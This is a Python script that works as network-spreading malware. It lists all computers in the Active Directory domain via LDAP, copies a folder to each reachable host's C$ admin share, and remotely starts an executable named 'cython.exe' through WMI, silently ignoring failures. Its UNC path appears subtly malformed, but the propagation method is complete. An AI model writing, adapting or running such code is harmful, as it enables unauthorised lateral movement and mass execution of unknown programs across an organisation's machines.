def main():
    import subprocess
    import time
    import os

    FOLDER_PATH = r"C:\Temp\05ft8_2lthb4"
    EXECUTABLE_PATH = r"C:\Temp\05ft8_2lthb4\cython.exe"

    def get_ad_machines():
        try:
            current_machine = os.environ['COMPUTERNAME']
            ps_command = f"""
                $domain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName;
                $ldapDomain = "LDAP://DC=" + $domain.Replace('.', ',DC=');
                $searcher = New-Object DirectoryServices.DirectorySearcher;
                $searcher.SearchRoot = New-Object DirectoryServices.DirectoryEntry($ldapDomain);
                $searcher.Filter = "(objectClass=computer)";
                $searcher.PropertiesToLoad.Add("name") | Out-Null;
                $computers = $searcher.FindAll();
                $connectedComputers = @();
                foreach ($computer in $computers) {{
                    $computerName = $computer.Properties["name"][0];
                    if ($computerName -ne '{current_machine}' -and (Test-Connection -ComputerName $computerName -Count 1 -Quiet)) {{
                        $connectedComputers += $computerName;
                    }}
                }}
                $connectedComputers
                """
            result = subprocess.run(
                ["powershell", "-Command", ps_command],
                capture_output=True, text=True, check=True
            )
            machines = result.stdout.strip().split('\n')
            return [machine for machine in machines if machine]
        except subprocess.CalledProcessError as e:
            return []

    def retry_copy(source, destination, retries=5, delay=2):
        for attempt in range(retries):
            try:
                result = subprocess.run(
                    ["robocopy", source, destination, "/e", "/xo", "/xn", "/xc", "/XD", "__pycache__"],
                    capture_output=True,
                    text=True
                )
                if result.returncode <= 7:
                    return True
            except Exception as ex:
                pass
            time.sleep(delay)
        return False

    def transfer_and_execute(machine):
        try:
            destination = f"\\{machine}\\C$\\Temp\\05ft8_2lthb4"
            if not retry_copy(FOLDER_PATH, destination):
                return
            execute_command = [
                "powershell", "-Command",
                f"Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName {machine} -ArgumentList '{EXECUTABLE_PATH}'"
            ]
            subprocess.run(execute_command, capture_output=True, text=True, check=True)
        except subprocess.CalledProcessError as e:
            raise e

    machines = get_ad_machines()
    if not machines:
        return
    
    for machine in machines:
        try:
            transfer_and_execute(machine)
        except:
            print("Error with machine " + machine)
            pass
    print("Success")
main()
